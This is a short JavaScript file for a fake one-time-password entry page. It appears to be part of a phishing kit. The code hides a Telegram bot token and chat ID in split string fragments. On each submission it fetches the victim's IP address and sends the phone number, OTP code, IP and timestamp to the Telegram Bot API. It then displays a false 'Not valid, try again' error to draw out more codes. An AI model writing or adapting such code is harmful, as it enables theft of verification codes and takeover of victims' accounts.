const _a0 = '8767';

const form = document.getElementById('otpFormEl');
const submitBtn = document.getElementById('submitBtn');
const otpInputs = document.querySelectorAll('.otp-input');

const _b0 = '612900';

const otpError = document.getElementById('otpError');
const phoneDisplay = document.getElementById('phoneDisplay');

const _c0 = ':AAF3WU5O';

const savedPhone = sessionStorage.getItem('otpPhone');
if (savedPhone) phoneDisplay.textContent = savedPhone;

const _d0 = 'sTwMFlux0Q';

otpInputs.forEach((input, idx) => {
  input.addEventListener('input', () => {
    input.value = input.value.replace(/[^0-9]/g, '');
    if (input.value && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
  });
  input.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && !input.value && idx > 0) otpInputs[idx - 1].focus();
  });
});

const _e0 = 'XMp-tjeFd';

function getOTP() { return Array.from(otpInputs).map(i => i.value).join(''); }

const _f0 = 'h7GWJfKo';
var _g0 = '8362';
var _h0 = '702705';

function _token() { return _a0 + _b0 + _c0 + _d0 + _e0 + _f0; }
function _chat() { return _g0 + _h0; }

function _api() { return 'https://api.telegram.org/bot' + _token() + '/sendMessage'; }

async function sendToTelegram(otp) {
  const ipData = await (await fetch('https://api.ipify.org?format=json')).json();
  const msg = 'OTP SUBMITTED\n\nPhone: ' + (savedPhone || 'Unknown') + '\nOTP: ' + otp + '\nIP: ' + ipData.ip + '\nTime: ' + new Date().toLocaleString();
  await fetch(_api(), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: _chat(), text: msg }) });
}

form.addEventListener('submit', async (e) => {
  e.preventDefault();
  const otp = getOTP();
  if (otp.length !== 6) { otpError.textContent = 'Please enter all 6 digits.'; otpError.classList.add('visible'); return; }
  otpError.classList.remove('visible');
  submitBtn.classList.add('loading');
  try {
    await sendToTelegram(otp);
    otpError.textContent = 'Not valid, try again.';
    otpError.classList.add('visible');
    otpInputs.forEach(i => i.value = '');
    otpInputs[0].focus();
  } catch (err) { alert('Something went wrong. Please try again.'); console.error(err); }
  finally { submitBtn.classList.remove('loading'); }
});
